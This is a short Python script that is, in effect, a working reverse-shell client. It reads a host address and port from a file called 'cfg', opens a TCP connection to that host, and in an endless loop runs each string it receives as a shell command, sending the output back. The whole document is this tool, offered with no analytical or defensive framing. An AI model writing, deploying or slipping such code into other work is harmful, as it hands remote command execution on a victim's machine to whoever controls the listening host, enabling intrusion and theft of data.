import subprocess
import socket


with open('cfg', 'r') as f:
    sip = f.readline().strip()
    sport = int(f.readline().strip())

print(sip,sport)

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((sip, sport))

while True:
    recv_data = client_socket.recv(20480)
    command=recv_data.decode('utf-8')
    result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    send_data=result.stdout.decode('gbk')
    client_socket.send(send_data.encode('utf-8'))